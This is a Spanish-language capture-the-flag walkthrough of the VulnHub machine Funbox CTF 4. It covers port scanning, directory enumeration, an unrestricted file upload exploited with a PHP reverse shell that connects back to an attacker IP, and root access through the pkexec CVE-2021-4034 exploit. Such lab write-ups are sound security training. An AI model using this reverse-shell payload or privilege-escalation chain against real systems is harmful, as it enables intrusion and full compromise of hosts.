# Funbox\_CTF\_4 VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-07 13:15 CEST
Nmap scan report for 192.168.5.131
Host is up (0.00037s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f6:b3:8f:f1:e3:b7:6c:18:ee:31:22:d3:d4:c9:5f:e6 (RSA)
|   256 45:c2:16:fc:3e:a9:fc:32:fc:36:fb:d7:ce:4f:2b:fe (ECDSA)
|_  256 4f:f8:46:72:22:9f:d3:10:51:9c:49:e0:76:5f:25:33 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
110/tcp open  pop3?
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: CAPABILITY
MAC Address: 00:0C:29:CC:EE:88 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 180.78 seconds
```

En la descripcion de `VulnHub` nos comenta el creador que hay algunos directorios en mayusculas, por lo que probare a entrar en el `robots.txt` pero en mayusculas, por lo que vemos si funciona...

```
URL = http://<IP>/ROBOTS.TXT
```

Y vemos lo siguiente...

```
Disallow: upload/



Disallow: igmseklhgmrjmtherij2145236
```

Si entramos en la segunda `URL`...

```
URL = http://<IP>/igmseklhgmrjmtherij2145236/
```

Veremos un `Forbiden` por lo que le tiraremos un `Gobuster`...

### Gobuster

```shell
gobuster dir -u http://<IP>/igmseklhgmrjmtherij2145236/ -w <WORDLIST> -x html,php,txt -t 50 -k
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.131/igmseklhgmrjmtherij2145236/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecList/Web/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 320]
/.php                 (Status: 403) [Size: 319]
/upload               (Status: 301) [Size: 342] [--> http://192.168.5.131/igmseklhgmrjmtherij2145236/upload/]
/upload.html          (Status: 200) [Size: 297]
/upload.php           (Status: 200) [Size: 319]
/.html                (Status: 403) [Size: 320]
/.php                 (Status: 403) [Size: 319]
```

Vemos varias cosas interesantes...

Si nos vamos a `/upload.php` veremos que podemos subir cualquier archivo, por lo que haremos lo siguiente...

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Creamos un archivo para hacernos una `Reverse Shell` y subimos dicho archivo...

Una vez subido, nos pondra que se subio correctamente y antes de ir al archivo nos pondremos a la escucha...

```shell
nc -lvnp <PORT>
```

Por lo que ahora estando preparados, vamos a la siguiente `URL`...

```
URL = http://<IP>/igmseklhgmrjmtherij2145236/upload/
```

Pero nos pondra otro `Forbiden`, pero como sabemos como se llama nuestro archivo que subimos probaremos a ponerlo en la `URL` seguido del `/upload` de la siguiente manera...

```
URL = http://<IP>/igmseklhgmrjmtherij2145236/upload/shell.php
```

Y si hacemos esto, funcionara, por lo que una vez entres dentro, nos creara una `shell` con el usuario `www-data`...

Por lo que la sanitizaremos...

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si hacemos lo siguiente...

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Veremos la siguiente linea...

```
38319     24 -rwsr-xr-x   1 root     root    23376 Jan 18  2016 /usr/bin/pkexec
```

Esto actua como un `/bin/bash` que tiene permisos `SUID`, por lo que haremos lo siguiente...

URL = https://github.com/Almorabea/pkexec-exploit

Esto nos lo llevaremos al servidor victima, ya sea copiando el contenido de `python` o transferirlo con algun comando como `curl` o `wget`, pero como no estan instalados ni `curl` y `wget` haremos otra cosa, si nos acordamos de que anteriormente podemos subir archivos desde la pagina web, subiremos el `.py` desde la pagina web y lo moveremos desde terminal hasta `/tmp` para poder iniciarlo...

Una vez hecho todo eso, haremos lo siguiente...

```shell
chmod +x CVE-2021-4034.py
```

```shell
python3 CVE-2021-4034.py
```

Info:

```
Do you want to choose a custom payload? y/n (n use default payload)  n
[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7f9a417d14e8 at 0x7f9a416659b0>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# whoami
root
#
```

Y con esto ya seriamos `root`, por lo que leeremos la flag...

> flag.txt (flag\_final)

```
(  _`\              ( )                       (  _`\(_   _)(  _`\ 
| (_(_)_   _   ___  | |_      _          _    | ( (_) | |  | (_(_)
|  _) ( ) ( )/' _ `\| '_`\  /'_`\ (`\/')(_)   | |  _  | |  |  _)  
| |   | (_) || ( ) || |_) )( (_) ) >  <  _    | (_( ) | |  | |    
(_)   `\___/'(_) (_)(_,__/'`\___/'(_/\_)(_)   (____/' (_)  (_)    

Well done ! Made with ❤ by @0815R2d2 ! I look forward to see this screenshot on twitter ;-)
```
